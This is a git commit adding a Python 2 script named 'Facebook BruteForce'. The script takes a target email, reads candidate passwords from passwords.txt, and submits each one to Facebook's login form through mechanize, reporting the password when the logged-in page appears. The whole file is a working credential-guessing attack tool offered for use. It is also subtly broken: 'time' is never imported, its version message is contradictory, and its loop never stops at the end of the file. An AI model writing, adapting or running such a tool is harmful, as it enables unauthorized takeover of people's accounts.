41ab3336e6cd8c6aaef82735155b98f3a3200762
Werths <24620094+IAmBlackHacker@users.noreply.github.com>
2018-11-12 14:15:33 +0530

    Add files via upload

---
+++ fb2.py
@@ -0,0 +1,52 @@
+import sys
+
+if sys.version_info[0] !=2: 
+	print('''--------------------------------------
+	REQUIRED PYTHON 2.x
+	use: python3 fb.py
+	Send your problems on https://m.me/B14CKH4K3R
+--------------------------------------
+			''')
+	sys.exit()
+
+post_url='https://www.facebook.com/login.php'
+headers = {
+	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+
+try:
+	import mechanize
+	import urllib2
+	browser = mechanize.Browser()
+	browser.addheaders = [('User-Agent',headers['User-Agent'])]
+	browser.set_handle_robots(False)
+except:
+	print('\n\tPlease install mechanize.\n')
+	sys.exit()
+
+print('\n---------- Welcome To Facebook BruteForce ----------\n')
+file=open('passwords.txt','r')
+
+email=str(raw_input('Enter Email/Username : ').strip())
+
+print "\nTarget Email ID : ",email
+print "\nTrying Passwords from list ..."
+
+i=0
+while file:
+	passw=file.readline().strip()
+	i+=1
+	print str(i) +" : ",passw
+	response = browser.open(post_url)
+	try:
+		if response.code == 200:
+			browser.select_form(nr=0)
+			browser.form['email'] = email
+			browser.form['pass'] = passw
+			response = browser.submit()
+			if 'Find Friends' in response.read():
+				print('Your password is : ',passw)
+				break
+	except:
+		print('\nSleeping for time : 5 min\n')
+		time.sleep(300)
